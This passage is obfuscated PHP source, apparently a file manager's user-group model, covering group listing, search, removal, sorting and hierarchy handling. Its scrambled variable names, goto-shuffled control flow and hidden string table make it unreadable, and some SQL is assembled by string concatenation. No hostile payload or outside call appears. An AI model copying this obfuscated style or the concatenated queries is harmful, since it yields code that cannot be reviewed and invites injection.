$A¨œİ‘²‘¼[416], null); $this->metaSet($cğê™‘–Ì›, $A¨œİ‘²‘¼[415], null); return; } $bæƒÙ…Å„ = array($A¨œİ‘²‘¼[416] => str_replace($A¨œİ‘²‘¼[50], $A¨œİ‘²‘¼[33], Pinyin::encode($a•¯¯¢™Ô)), $A¨œİ‘²‘¼[415] => Pinyin::encode($a•¯¯¢™Ô, $A¨œİ‘²‘¼[531])); $this->metaSet($cğê™‘–Ì›, $bæƒÙ…Å„); } protected function groupStatus($fˆ®Šêè‘, $eÎîÂŸ¥) { goto CÁ„“ŠÂë„; cŒ˜ƒÌöÕ: foreach ($E¾ùÀÄ”ùÇ as $fˆ®Šêè‘) { $fª°ëéùß[] = array($d‚Êğ¸›ªå[2108] => $fˆ®Šêè‘, $d‚Êğ¸›ªå[89] => $d‚Êğ¸›ªå[692], $d‚Êğ¸›ªå[359] => $eÎîÂŸ¥); } return Model($d‚Êğ¸›ªå[2186])->addAll($fª°ëéùß, array(), !0); goto CÅÆ¶õÍ¦‹; CÁ„“ŠÂë„: $d‚Êğ¸›ªå =& $_SERVER[Å¸ş]; $f¸Ú„ÙªÉ… = $this->getInfoSimple($fˆ®Šêè‘); if (!$f¸Ú„ÙªÉ…) { return !1; } goto b²ºóæéí; b²ºóæéí: if ($eÎîÂŸ¥ == $d‚Êğ¸›ªå[83]) { $E¾ùÀÄ”ùÇ = $this->parentLevelArray($f¸Ú„ÙªÉ…[$d‚Êğ¸›ªå[461]]); } else { $A¦Œâœ“×¯ = array($d‚Êğ¸›ªå[527] => array($d‚Êğ¸›ªå[485], $f¸Ú„ÙªÉ…[$d‚Êğ¸›ªå[461]] . $f¸Ú„ÙªÉ…[$d‚Êğ¸›ªå[2108]] . $d‚Êğ¸›ªå[486])); $E¾ùÀÄ”ùÇ = $this->where($A¦Œâœ“×¯)->field($d‚Êğ¸›ªå[2108])->select(); $E¾ùÀÄ”ùÇ = array_to_keyvalue($E¾ùÀÄ”ùÇ, $d‚Êğ¸›ªå[33], $d‚Êğ¸›ªå[2108]); } $E¾ùÀÄ”ùÇ[] = $f¸Ú„ÙªÉ…[$d‚Êğ¸›ªå[2108]]; $fª°ëéùß = array(); goto cŒ˜ƒÌöÕ; CÅÆ¶õÍ¦‹: } protected function groupRemove($a‘·¡¯›å) { goto F÷‰Ã‡íâ; DñÍØÎğó: if (!$D¯É×Ÿ×ï¤ || $D¯É×Ÿ×ï¤[$BÓãÅÙ”¹¼[463]] == 0) { return !1; } $bÙºÁÖ¯¢ = $this->getInfoSimple($D¯É×Ÿ×ï¤[$BÓãÅÙ”¹¼[463]]); $this->_changeChildLevel($D¯É×Ÿ×ï¤, $bÙºÁÖ¯¢, !0); goto B’ôù©è£Ü; a¹¿ìØ›¡Ğ: Model($BÓãÅÙ”¹¼[755])->groupRootRemove($a‘·¡¯›å); return $this->where($Fó‰Èº¨³£)->delete(); goto BÇÓ‘²à›Ù; F÷‰Ã‡íâ: $BÓãÅÙ”¹¼ =& $_SERVER[Å¸ş]; $Fó‰Èº¨³£ = array($BÓãÅÙ”¹¼[2108] => $a‘·¡¯›å); $D¯É×Ÿ×ï¤ = $this->where($Fó‰Èº¨³£)->find(); goto DñÍØÎğó; B’ôù©è£Ü: $this->where(array($BÓãÅÙ”¹¼[463] => $a‘·¡¯›å))->save(array($BÓãÅÙ”¹¼[463] => $D¯É×Ÿ×ï¤[$BÓãÅÙ”¹¼[463]])); Model($BÓãÅÙ”¹¼[2186])->where($Fó‰Èº¨³£)->delete(); Model($BÓãÅÙ”¹¼[2187])->where($Fó‰Èº¨³£)->delete(); goto a¹¿ìØ›¡Ğ; BÇÓ‘²à›Ù: } protected function groupSort($Aª«‹Ó­¼†) { $B©…×«¿  =& $_SERVER[Å¸ş]; $b‰øÑØ¨œ = array(); foreach ($Aª«‹Ó­¼† as $C¾áÇåõ‰ => $FÉí®Ê¼İƒ) { $b‰øÑØ¨œ[] = array($B©…×«¿ [2108], $FÉí®Ê¼İƒ, $B©…×«¿ [2130], $C¾áÇåõ‰ + 1); } $this->saveAll($b‰øÑØ¨œ); } public function listData() { $B¯Ê‚ØÃ´ˆ = $this->_makeOrder()->selectPage(50); $this->_listDataApply($B¯Ê‚ØÃ´ˆ[$_SERVER[Å¸ş][354]]); return $B¯Ê‚ØÃ´ˆ; } private function _makeOrder($B—›ŞÖ¥÷š = '') { goto dÚÅœ«®ó˜; C´´è˜Ñİõ: $B—›ŞÖ¥÷š = $B—›ŞÖ¥÷š . "{$aĞğƒî›™È}\40{$A²´¹×ÉÊì}\x2c\40\x67\x72\x6f\165\x70\x49\104\40\x61\x73\x63"; return $this->order($B—›ŞÖ¥÷š); goto bÏ ¬ó; dÚÅœ«®ó˜: $DçĞƒÇĞ =& $_SERVER[Å¸ş]; $c˜º—›Ôí = array($DçĞƒÇĞ[2108], $DçĞƒÇĞ[28], $DçĞƒÇĞ[2094], $DçĞƒÇĞ[187]); $aÌºÉÆ¨Ó = array($DçĞƒÇĞ[402] => $DçĞƒÇĞ[403], $DçĞƒÇĞ[404] => $DçĞƒÇĞ[405]); goto FÃšğ¯öšö; FÃšğ¯öšö: $aĞğƒî›™È = Input::get($DçĞƒÇĞ[407], $DçĞƒÇĞ[7], $DçĞƒÇĞ[2112], $c˜º—›Ôí); $A²´¹×ÉÊì = Input::get($DçĞƒÇĞ[408], $DçĞƒÇĞ[7], $DçĞƒÇĞ[2188], array($DçĞƒÇĞ[2188], $DçĞƒÇĞ[404])); $A²´¹×ÉÊì = $aÌºÉÆ¨Ó[$A²´¹×ÉÊì]; goto C´´è˜Ñİõ; bÏ ¬ó: } public function listChild($BùÊ§æÚÆÁ) { $f‡ĞˆÌ¹áÁ =& $_SERVER[Å¸ş]; $fø¬“¨óÉ = $this->where(array($f‡ĞˆÌ¹áÁ[463] => $BùÊ§æÚÆÁ))->_makeOrder()->selectPage(200); $this->_listDataApply($fø¬“¨óÉ[$f‡ĞˆÌ¹áÁ[354]]); return $fø¬“¨óÉ; } public function listByID($D¡øêĞ—ò›) { $B“’Î£˜‡  =& $_SERVER[Å¸ş]; if (!$D¡øêĞ—ò›) { return array(); } $FÖÛªĞ‘ƒï = array($B“’Î£˜‡ [2108] => array($B“’Î£˜‡ [7], $D¡øêĞ—ò›)); $b‘ÌÙìÍ¯ƒ = $this->where($FÖÛªĞ‘ƒï)->select(); $this->_listDataApply($b‘ÌÙìÍ¯ƒ); return $b‘ÌÙìÍ¯ƒ; } public function listSearch($FÜø¹¾´”) { goto CÆ»Š®ÍŒ»; A×íÜ–Œ‚: if (!trim($BÉë‘©¬ºµ)) { return !1; } $BÉë‘©¬ºµ = str_replace($A’¢ÍÑ‚İ[2191], $A’¢ÍÑ‚İ[2192], $BÉë‘©¬ºµ); $EšáÎ‹š¨˜ = array($A’¢ÍÑ‚İ[2108] => array($A’¢ÍÑ‚İ[754], "\45{$BÉë‘©¬ºµ}\x25"), $A’¢ÍÑ‚İ[28] => array($A’¢ÍÑ‚İ[754], "\x25{$BÉë‘©¬ºµ}\x25"), $A’¢ÍÑ‚İ[911] => $A’¢ÍÑ‚İ[2193]); goto d¨š×‚™§Á; d¨š×‚™§Á: if ($D ÀİµÉç) { $Bâİ¢¼ùÇÚ = $this->getInfoSimple($D ÀİµÉç); $EĞ†¹åâéô = $Bâİ¢¼ùÇÚ[$A’¢ÍÑ‚İ[461]] . $D ÀİµÉç . $A’¢ÍÑ‚İ[486]; $EšáÎ‹š¨˜ = array($EšáÎ‹š¨˜, array($A’¢ÍÑ‚İ[461] => array($A’¢ÍÑ‚İ[754], $EĞ†¹åâéô))); } $Añ×ŸËŞ¤Ö = $this->_makeOrder()->where($EšáÎ‹š¨˜)->selectPage(20); $Añ×ŸËŞ¤Ö = $Añ×ŸËŞ¤Ö ? $Añ×ŸËŞ¤Ö : array(); goto f±àš°ğÁ; CÆ»Š®ÍŒ»: $A’¢ÍÑ‚İ =& $_SERVER[Å¸ş]; $BÉë‘©¬ºµ = $FÜø¹¾´”[$A’¢ÍÑ‚İ[2189]]; $D ÀİµÉç = isset($FÜø¹¾´”[$A’¢ÍÑ‚İ[2190]]) ? $FÜø¹¾´”[$A’¢ÍÑ‚İ[2190]] : !1; goto A×íÜ–Œ‚; f±àš°ğÁ: if (!$Añ×ŸËŞ¤Ö || count($Añ×ŸËŞ¤Ö[$A’¢ÍÑ‚İ[354]]) < 5 && Input::check($BÉë‘©¬ºµ, $A’¢ÍÑ‚İ[306])) { goto d¼ÙÉ‡ªĞá; d¼ÙÉ‡ªĞá: $c•«¹½®‚ = $this->groupChildrenAll($D ÀİµÉç); $eá¬­»Œ­ = $this->_searchFromMeta($A’¢ÍÑ‚İ[415], $BÉë‘©¬ºµ, 10, $c•«¹½®‚); $FÉôîÚÕ‘ = $this->_searchFromMeta($A’¢ÍÑ‚İ[416], $BÉë‘©¬ºµ, 10, $c•«¹½®‚); goto F·ÁØ¸‹; d­ìç˜ÙÌ: $Añ×ŸËŞ¤Ö[$A’¢ÍÑ‚İ[351]][$A’¢ÍÑ‚İ[353]] = ceil($Añ×ŸËŞ¤Ö[$A’¢ÍÑ‚İ[351]][$A’¢ÍÑ‚İ[352]] / $Añ×ŸËŞ¤Ö[$A’¢ÍÑ‚İ[351]][$A’¢ÍÑ‚İ[349]]); goto A¥é–©ˆé; F·ÁØ¸‹: $cÌ´ò“ƒá = array_merge($eá¬­»Œ­, $FÉôîÚÕ‘, $Añ×ŸËŞ¤Ö[$A’¢ÍÑ‚İ[354]]); $Añ×ŸËŞ¤Ö[$A’¢ÍÑ‚İ[354]] = array_unique_by_key($cÌ´ò“ƒá, $A’¢ÍÑ‚İ[2108]); $Añ×ŸËŞ¤Ö[$A’¢ÍÑ‚İ[351]][$A’¢ÍÑ‚İ[352]] = count($Añ×ŸËŞ¤Ö[$A’¢ÍÑ‚İ[354]]); goto d­ìç˜ÙÌ; A¥é–©ˆé: } $this->_listDataApply($Añ×ŸËŞ¤Ö[$A’¢ÍÑ‚İ[354]]); return $Añ×ŸËŞ¤Ö; goto AŠˆèŸê’; AŠˆèŸê’: } protected function groupChildrenAll($eğã£Êƒõ÷) { $AÈğåéè =& $_SERVER[Å¸ş]; if (!$eğã£Êƒõ÷) { return !1; } if (is_string($eğã£Êƒõ÷)) { $eğã£Êƒõ÷ = array($eğã£Êƒõ÷); } $Cí’Òø¾÷ = $eğã£Êƒõ÷; foreach ($eğã£Êƒõ÷ as $DºäõäêŠè) { $D¾Â„²÷®ç = $this->getInfoSimple($DºäõäêŠè); $C­ª½‘â¡ = array($AÈğåéè[461] => array($AÈğåéè[754], $D¾Â„²÷®ç[$AÈğåéè[461]] . $DºäõäêŠè . $AÈğåéè[486])); $eİ·£î­İ = $this->field($AÈğåéè[2108])->where($C­ª½‘â¡)->select(); $Cí’Òø¾÷ = array_merge($Cí’Òø¾÷, array_to_keyvalue($eİ·£î­İ, $AÈğåéè[33], $AÈğåéè[2108])); } return array_unique($Cí’Òø¾÷); } private function _searchFromMeta($c‚ºôİ‹ğ³, $ešÏåä“ˆ¢, $CÖò¦‘õ’”, $d–íøĞŒ¹) { goto DÑÉËÇöÕÜ; bõå‡ñÜë¬: if ($d–íøĞŒ¹) { $BÖ­ùïë·Ø[$cñÔÉ›¿Óµ[2108]] = array($cñÔÉ›¿Óµ[7], $d–íøĞŒ¹); } $Bƒë‹©ŞŞ« = Model($cñÔÉ›¿Óµ[2194])->where($BÖ­ùïë·Ø)->limit($CÖò¦‘õ’”)->select(); if (!$Bƒë‹©ŞŞ«) { return array(); } goto CİµİŠ†»‚; DÑÉËÇöÕÜ: $cñÔÉ›¿Óµ =& $_SERVER[Å¸ş]; $ešÏåä“ˆ¢ = strtolower($ešÏåä“ˆ¢); $BÖ­ùïë·Ø = array($cñÔÉ›¿Óµ[89] => $c‚ºôİ‹ğ³, $cñÔÉ›¿Óµ[359] => array($cñÔÉ›¿Óµ[754], "\45{$ešÏåä“ˆ¢}\45")); goto bõå‡ñÜë¬; CİµİŠ†»‚: $Bƒë‹©ŞŞ« = array_to_keyvalue($Bƒë‹©ŞŞ«, $cñÔÉ›¿Óµ[33], $cñÔÉ›¿Óµ[2108]); $bßÀÚˆíñ = $this->where(array($cñÔÉ›¿Óµ[2185] => array($cñÔÉ›¿Óµ[7], $Bƒë‹©ŞŞ«)))->select(); if (!$bßÀÚˆíñ) { return array(); } goto dÍÀç§Ù÷„; dÍÀç§Ù÷„: return $bßÀÚˆíñ; goto c¦¹ÙÌÕ¾; c¦¹ÙÌÕ¾: } protected function _listDataApplyItem($C§Äâá™¯¿) { $a¥š¸ĞØ¯ = array($C§Äâá™¯¿); $this->_listDataApply($a¥š¸ĞØ¯); return $a¥š¸ĞØ¯[0]; } protected function _listDataApply(&$EÓ‚²ÚŠ•Î) { goto d¤ßø˜šŒ·; dŞŞÑŠ÷Š: $this->_listAppendParent($EÓ‚²ÚŠ•Î); $this->_listAppendSourceRoot($EÓ‚²ÚŠ•Î, $c°‡ø¸çŞ); goto c³¯İ¬ÖÚë; b‡ĞŞŠÕô»: $this->_listAppendChildren($EÓ‚²ÚŠ•Î); $this->_listAppendChildrenMember($EÓ‚²ÚŠ•Î); $this->_listAppendMeta($EÓ‚²ÚŠ•Î, $c°‡ø¸çŞ); goto dŞŞÑŠ÷Š; d¤ßø˜šŒ·: $Cµß³†Òø =& $_SERVER[Å¸ş]; if (!$EÓ‚²ÚŠ•Î) { return; } $c°‡ø¸çŞ = array_to_keyvalue($EÓ‚²ÚŠ•Î, $Cµß³†Òø[33], $Cµß³†Òø[2108]); goto b‡ĞŞŠÕô»; c³¯İ¬ÖÚë: } private function _listAppendChildren(&$Fééš½‰•˜) { goto c¡šÕæÁ; dâøÄõ‹“—: $e¿…ğŠ† í = array_to_keyvalue($e¿…ğŠ† í, $c‰ÄÙÎÆÕÖ[452]); foreach ($Fééš½‰•˜ as &$c„ùÌî„•Ğ) { $c„ùÌî„•Ğ[$c‰ÄÙÎÆÕÖ[2195]] = isset($e¿…ğŠ† í[$c„ùÌî„•Ğ[$c‰ÄÙÎÆÕÖ[2108]] . $c‰ÄÙÎÆÕÖ[2196]]); } unset($c„ùÌî„•Ğ); goto A“—¶ÅÂ±; c¡šÕæÁ: $c‰ÄÙÎÆÕÖ =& $_SERVER[Å¸ş]; $c©˜‰‰à°” = $c‰ÄÙÎÆÕÖ[361]; $e¿…ğŠ† í = array(); goto C•İİñÁÔ; C•İİñÁÔ: $Bß°‰ó¥µ = count($Fééš½‰•˜); $a£Ùåê¬ğ³ = $this->tablePrefix . $this->tableName; for ($C­ğçÙß°ø = 0, $dÀ™«ÅØĞ© = 0; $C­ğçÙß°ø < $Bß°‰ó¥µ; $C­ğçÙß°ø++) { $dÀ™«ÅØĞ©++; $eóôŠ†‰¥ = $Fééš½‰•˜[$C­ğçÙß°ø][$c‰ÄÙÎÆÕÖ[2108]]; $c©˜‰‰à°” .= "\x53\x45\114\105\x43\x54\40\52\40\106\122\x4f\x4d\40\50\123\x45\x4c\x45\x43\124\40\47{$eóôŠ†‰¥}\x5f\x63\x68\151\x6c\144\x27\x20\x61\163\40\x68\141\163\x20\106\x52\x4f\115\x20\140{$a£Ùåê¬ğ³}\x60\40\x77\150\145\x72\145\40\160\x61\162\145\156\x74\x49\104\x3d{$eóôŠ†‰¥}\40\154\x69\x6d\x69\164\40\61\x29\40\141\163\x20\x74\x62\137{$eóôŠ†‰¥}\40\x75\x6e\151\157\156\40\x61\154\154\x20"; if (($dÀ™«ÅØĞ© >= 20 || $C­ğçÙß°ø == $Bß°‰ó¥µ - 1) && $c©˜‰‰à°”) { $c©˜‰‰à°” = substr($c©˜‰‰à°”, 0, -strlen($c‰ÄÙÎÆÕÖ[451])); $d­ïõäò• = $this->query($c©˜‰‰à°”); $e¿…ğŠ† í = array_merge($e¿…ğŠ† í, $d­ïõäò•); $dÀ™«ÅØĞ© = 0; $c©˜‰‰à°” = $c‰ÄÙÎÆÕÖ[33]; } } goto dâøÄõ‹“—; A“—¶ÅÂ±: } private function _listAppendChildrenMember(&$e“‘‹ïƒ) { goto dŸ×Ï¿ºŞ; BŞÂ„’Ş‡: $dê¡—›¼åí = array_to_keyvalue($dê¡—›¼åí, $F‚ç”™ºà²[452]); foreach ($e“‘‹ïƒ as &$C©†„ÌàÁ½) { $C©†„ÌàÁ½[$F‚ç”™ºà²[2197]] = isset($dê¡—›¼åí[$C©†„ÌàÁ½[$F‚ç”™ºà²[2108]] . $F‚ç”™ºà²[2196]]); } unset($C©†„ÌàÁ½); goto A›É™òÊŸ¤; CÈè†áø¼»: $EöÊ¸ö“ò‘ = count($e“‘‹ïƒ); $DÇà£é‘¹Ì = $this->tablePrefix . $F‚ç”™ºà²[2187]; for ($aœ¼Ôã­Çƒ = 0, $aÎİ°½•å˜ = 0; $aœ¼Ôã­Çƒ < $EöÊ¸ö“ò‘; $aœ¼Ôã­Çƒ++) { $aÎİ°½•å˜++; $a“†ÂÏšÏÀ = $e“‘‹ïƒ[$aœ¼Ôã­Çƒ][$F‚ç”™ºà²[2108]]; $F ¹Í±÷”ç .= "\x53\x45\x4c\x45\103\124\x20\x2a\40\x46\122\117\x4d\x20\x28\x53\105\x4c\105\x43\124\40\47{$a“†ÂÏšÏÀ}\137\143\150\151\x6c\144\x27\40\x61\x73\x20\x68\141\163\40\106\122\117\x4d\40\140{$DÇà£é‘¹Ì}\x60\40\x77\150\145\x72\x65\x20\147\x72\x6f\x75\x70\x49\x44\x3d{$a“†ÂÏšÏÀ}\40\154\151\x6d\x69\164\x20\x31\x29\x20\141\x73\40\x74\142\137{$a“†ÂÏšÏÀ}\40\165\x6e\151\x6f\156\x20\x61\154\154\x20"; if (($aÎİ°½•å˜ >= 20 || $aœ¼Ôã­Çƒ == $EöÊ¸ö“ò‘ - 1) && $F ¹Í±÷”ç) { $F ¹Í±÷”ç = substr($F ¹Í±÷”ç, 0, -strlen($F‚ç”™ºà²[451])); $Fƒ¤™Šì‹ˆ = $this->query($F ¹Í±÷”ç); $dê¡—›¼åí = array_merge($dê¡—›¼åí, $Fƒ¤™Šì‹ˆ); $aÎİ°½•å˜ = 0; $F ¹Í±÷”ç = $F‚ç”™ºà²[33]; } } goto BŞÂ„’Ş‡; dŸ×Ï¿ºŞ: $F‚ç”™ºà² =& $_SERVER[Å¸ş]; $F ¹Í±÷”ç = $F‚ç”™ºà²[361]; $dê¡—›¼åí = array(); goto CÈè†áø¼»; A›É™òÊŸ¤: } private function _listAppendMeta(&$fÓİ†‰‡İß, $BììçèÃ) { goto d‹´ÃÅ•¦‡; BÒãøŒµç¨: $Cïˆ”ÓÉ´¦ = array_to_keyvalue_group($Cïˆ”ÓÉ´¦, $a¢ƒçƒ•„µ[2108]); foreach ($Cïˆ”ÓÉ´¦ as &$dĞ®ëÈ“¡à) { $dĞ®ëÈ“¡à = array_to_keyvalue($dĞ®ëÈ“¡à, $a¢ƒçƒ•„µ[89], $a¢ƒçƒ•„µ[359]); } unset($dĞ®ëÈ“¡à); goto b¡±œø·’ƒ; b¡±œø·’ƒ: foreach ($fÓİ†‰‡İß as &$eâ£ñŞ˜¢) { $eâ£ñŞ˜¢[$a¢ƒçƒ•„µ[417]] = array(); if (isset($Cïˆ”ÓÉ´¦[$eâ£ñŞ˜¢[$a¢ƒçƒ•„µ[2108]]])) { $eâ£ñŞ˜¢[$a¢ƒçƒ•„µ[417]] = $Cïˆ”ÓÉ´¦[$eâ£ñŞ˜¢[$a¢ƒçƒ•„µ[2108]]]; } } unset($eâ£ñŞ˜¢); goto EÄ„Ï‹Éƒ; d‹´ÃÅ•¦‡: $a¢ƒçƒ•„µ =& $_SERVER[Å¸ş]; $FÍ²Íš©ãó = array($a¢ƒçƒ•„µ[2108] => array($a¢ƒçƒ•„µ[7], $BììçèÃ)); $Cïˆ”ÓÉ´¦ = Model($a¢ƒçƒ•„µ[2186])->where($FÍ²Íš©ãó)->select(); goto BÒãøŒµç¨; EÄ„Ï‹Éƒ: } protected function parentLevelArray($c°ì¯åéÁï) { $CÅ‹Ãæà³î =& $_SERVER[Å¸ş]; $c°ì¯åéÁï = explode($CÅ‹Ãæà³î[47], trim($c°ì¯åéÁï, $CÅ‹Ãæà³î[47])); $c°ì¯åéÁï = array_remove_value($c°ì¯åéÁï, $CÅ‹Ãæà³î[470]); return $c°ì¯åéÁï; } private function _listAppendParent(&$b®àÅˆ˜Ç˜) { goto DÆ°Ã‘³¯¬; D×ŠƒÀÛñ©: unset($C£‰•‡é¿); goto e¥ï’ÕğìÒ; DÆ°Ã‘³¯¬: $B¬¬ÉÚ”ÃÇ =& $_SERVER[Å¸ş]; $bë‚ŒÇµ‘ = array(); foreach ($b®àÅˆ˜Ç˜ as &$C£‰•‡é¿) { $bë‚ŒÇµ‘[$C£‰•‡é¿[$B¬¬ÉÚ”ÃÇ[2108]]] = $C£‰•‡é¿[$B¬¬ÉÚ”ÃÇ[28]]; $câçÔ«‘Ò· = $this->parentLevelArray($C£‰•‡é¿[$B¬¬ÉÚ”ÃÇ[461]]); foreach ($câçÔ«‘Ò· as $c†í¬„¨•ù) { if (!isset($bë‚ŒÇµ‘[$c†í¬„¨•ù])) { $bë‚ŒÇµ‘[$c†í¬„¨•ù] = 0; } } } goto eÔÎ÷³œÄ; eÔÎ÷³œÄ: unset($C£‰•‡é¿); $DæÑ á¼Øó = array(); foreach ($bë‚ŒÇµ‘ as $D¤‚­‹‰Í => $f¯‰ÏĞÉô¡) { if (!$f¯‰ÏĞÉô¡) { $DæÑ á¼Øó[] = $D¤‚­‹‰Í; } } goto BŞ™ˆŸˆï; BŞ™ˆŸˆï: if ($DæÑ á¼Øó) { $FØóèÕÌ® = array($B¬¬ÉÚ”ÃÇ[2185] => array($B¬¬ÉÚ”ÃÇ[384], $DæÑ á¼Øó)); $C·ˆª„ƒ±¨ = $this->field($B¬¬ÉÚ”ÃÇ[2198])->where($FØóèÕÌ®)->select(); $Dåæ¦“Ô‰ó = array_to_keyvalue($C·ˆª„ƒ±¨, $B¬¬ÉÚ”ÃÇ[2108], $B¬¬ÉÚ”ÃÇ[28]); $bë‚ŒÇµ‘ = array_merge_index($bë‚ŒÇµ‘, $Dåæ¦“Ô‰ó); } $b¨î‚†íœÚ = $GLOBALS[$B¬¬ÉÚ”ÃÇ[6]][$B¬¬ÉÚ”ÃÇ[84]][$B¬¬ÉÚ”ÃÇ[2199]]; foreach ($b®àÅˆ˜Ç˜ as &$C£‰•‡é¿) { $câçÔ«‘Ò· = $this->parentLevelArray($C£‰•‡é¿[$B¬¬ÉÚ”ÃÇ[461]]); $BŸÌ˜õ„øÅ = $B¬¬ÉÚ”ÃÇ[33]; foreach ($câçÔ«‘Ò· as $D¤‚­‹‰Í => $c†í¬„¨•ù) { if ($b¨î‚†íœÚ && $D¤‚­‹‰Í == 0) { continue; } $BŸÌ˜õ„øÅ .= $bë‚ŒÇµ‘[$c†í¬„¨•ù] . $B¬¬ÉÚ”ÃÇ[8]; } if ($câçÔ«‘Ò·) { $BŸÌ˜õ„øÅ .= $C£‰•‡é¿[$B¬¬ÉÚ”ÃÇ[28]]; } $C£‰•‡é¿[$B¬¬ÉÚ”ÃÇ[465]] = str_replace($B¬¬ÉÚ”ÃÇ[469], $B¬¬ÉÚ”ÃÇ[8], $BŸÌ˜õ„øÅ); } goto D×ŠƒÀÛñ©; e¥ï’ÕğìÒ: } private function _listAppendSourceRoot(&$dÈ«ƒ­ïõ•, $f¼¡òÄ¿) { goto d‘‹ìùí²; d‘‹ìùí²: $a¹Üå£¹ƒå =& $_SERVER[Å¸ş]; $B‚Ú‡¦Í‘â = array($a¹Üå£¹ƒå[371] => SourceModel::TYPE_GROUP, $a¹Üå£¹ƒå[463] => 0, $a¹Üå£¹ƒå[458] => array($a¹Üå£¹ƒå[7], $f¼¡òÄ¿)); $b­ÍÁã¨ƒ˜ = $a¹Üå£¹ƒå[2200]; goto C×ïÒ•Š¢õ; cğŠÓêí: foreach ($dÈ«ƒ­ïõ• as &$cÚÕİ´šâ) { $cÚÕİ´šâ[$a¹Üå£¹ƒå[391]] = $Cğ•êˆ³³[$cÚÕİ´šâ[$a¹Üå£¹ƒå[2108]]] ? $Cğ•êˆ³³[$cÚÕİ´šâ[$a¹Üå£¹ƒå[2108]]] : array(); } unset($cÚÕİ´šâ); goto aÍôÑÉğ÷; C×ïÒ•Š¢õ: $Cğ•êˆ³³ = Model($a¹Üå£¹ƒå[755])->order($a¹Üå£¹ƒå[2201])->field($b­ÍÁã¨ƒ˜)->where($B‚Ú‡¦Í‘â)->select(); $Cğ•êˆ³³ = array_to_keyvalue($Cğ•êˆ³³, $a¹Üå£¹ƒå[458]); $Cğ•êˆ³³ = array_remove_key($Cğ•êˆ³³, $a¹Üå£¹ƒå[458]); goto cğŠÓêí; aÍôÑÉğ÷: } protected function groupMerge($aÇ¹ƒÎğ) { $aÇ¹ƒÎğ = array_values(array_unique($aÇ¹ƒÎğ)); $F¥‰ÇËÑ¦ = array(); for ($C¦ËœõÈè = 0; $C¦ËœõÈè < count($aÇ¹ƒÎğ); $C¦ËœõÈè++) { $bì‘¾ğ°´¼ = !1; for ($EÜ©Â†Ó§œ = 0; $EÜ©Â†Ó§œ < count($aÇ¹ƒÎğ); $EÜ©Â†Ó§œ++) { if ($C¦ËœõÈè == $EÜ©Â†Ó§œ) { continue; } if ($this->isParentOf($aÇ¹ƒÎğ[$EÜ©Â†Ó§œ], $aÇ¹ƒÎğ[$C¦ËœõÈè])) { $bì‘¾ğ°´¼ = !0; break; } } if (!$bì‘¾ğ°´¼) { $F¥‰ÇËÑ¦[] = $aÇ¹ƒÎğ[$C¦ËœõÈè]; } } return $F¥‰ÇËÑ¦; } protected function isParentOf($f——ÒÆŒ°, $E•×½”³†¯) { goto cŞ´«œ‰µŠ; CÁÊÃéó‰: return !1; goto dá‡ÉÌ§‹…; cœ¬ƒ¦Éàä: $CšùÛÓÖĞî = $this->getInfoSimple($E•×½”³†¯); $b—Ù¢Å¦ÑÙ = $Eƒ¬‡Ò·[$FÄ×œŠ†ˆœ[461]] . $f——ÒÆŒ° . $FÄ×œŠ†ˆœ[47]; if (substr($CšùÛÓÖĞî[$FÄ×œŠ†ˆœ[461]], 0, strlen($b—Ù¢Å¦ÑÙ)) == $b—Ù¢Å¦ÑÙ) { return !0; } goto CÁÊÃéó‰; cŞ´«œ‰µŠ: $FÄ×œŠ†ˆœ =& $_SERVER[Å¸ş]; if (!$f——ÒÆŒ° || !$E•×½”³†¯ || $f——ÒÆŒ° == $E•×½”³†¯) { return !1; } $Eƒ¬‡Ò· = $this->getInfoSimple($f——ÒÆŒ°); goto cœ¬ƒ¦Éàä; dá‡ÉÌ§‹…: } public function groupShowRoot($cÈõòï¦¾, $b‘¡†–ì” = false) { goto c™¤…Áë±; c™¤…Áë±: $c„§†¸¡İ… =& $_SERVER[Å¸ş]; $AŠ¦­Ğİå = $this->getInfo($cÈõòï¦¾); if (!$AŠ¦­Ğİå) { return array(); } goto e»Ó‚Á¢ÀÕ; bŸ¢ÆÔö»æ: if ($b‘¡†–ì” && count($BñÖ¦Ñ‹”ƒ) == 1) { return $d¼â÷¬æŠğ; } if (!$AŠ¦­Ğİå[$c„§†¸¡İ…[417]] || !isset($AŠ¦­Ğİå[$c„§†¸¡İ…[417]][$c„§†¸¡İ…[2183]]) || $AŠ¦­Ğİå[$c„§†¸¡İ…[417]][$c„§†¸¡İ…[2183]] == $c„§†¸¡İ…[2157]) { return $this->groupShowRoot($BñÖ¦Ñ‹”ƒ[count($BñÖ¦Ñ‹”ƒ) - 1], $b‘¡†–ì”); } if ($AŠ¦­Ğİå[$c„§†¸¡İ…[417]][$c„§†¸¡İ…[2183]] == $c„§†¸¡İ…[346]) { $f·©ÈĞÂ‚ = explode($c„§†¸¡İ…[47], $AŠ¦­Ğİå[$c„§†¸¡İ…[417]][$c„§†¸¡İ…[2184]]); if ($f·©ÈĞÂ‚) { $d¼â÷¬æŠğ = array_merge($d¼â÷¬æŠğ, $f·©ÈĞÂ‚); } } goto F¨øëœ¥åÄ; e»Ó‚Á¢ÀÕ: $BñÖ¦Ñ‹”ƒ = $this->parentLevelArray($AŠ¦­Ğİå[$c„§†¸¡İ…[461]]); $d¼â÷¬æŠğ = array($cÈõòï¦¾); if (count($BñÖ¦Ñ‹”ƒ) == 0) { return $d¼â÷¬æŠğ; } goto bŸ¢ÆÔö»æ; F¨øëœ¥åÄ: return $d¼â÷¬æŠğ; goto A†»Û°‡¨ª; A†»Û°‡¨ª: } protected function resetParentLevel() { $D¾šÌÙ± =& $_SERVER[Å¸ş]; $C·èùö‹×¸ = $D¾šÌÙ±[2108]; $BÅôŒÚ¢‰´ = $this->select(); $BÅôŒÚ¢‰´ = array_to_keyvalue($BÅôŒÚ¢‰´, $C·èùö‹×¸); foreach ($BÅôŒÚ¢‰´ as $CãÅªàƒ®²) { goto Fƒ†Ô‡Ú; E‚İ¿œˆë: $this->where(array($C·èùö‹×¸ => $CãÅªàƒ®²[$C·èùö‹×¸]))->save(array($D¾šÌÙ±[527] => $A—›Ÿê•–‡)); goto E£•ÔìæŸ‹; Fƒ†Ô‡Ú: $CËÊ‘çŠè = $CãÅªàƒ®²; $A—›Ÿê•–‡ = array(); while ($CËÊ‘çŠè[$D¾šÌÙ±[463]] != 0) { $A—›Ÿê•–‡[] = $CËÊ‘çŠè[$D¾šÌÙ±[463]]; $CËÊ‘çŠè = $BÅôŒÚ¢‰´[$CËÊ‘çŠè[$D¾šÌÙ±[463]]]; } goto D© İöä——; D© İöä——: $A—›Ÿê•–‡[] = 0; $A—›Ÿê•–‡ = $D¾šÌÙ±[47] . implode($D¾šÌÙ±[47], 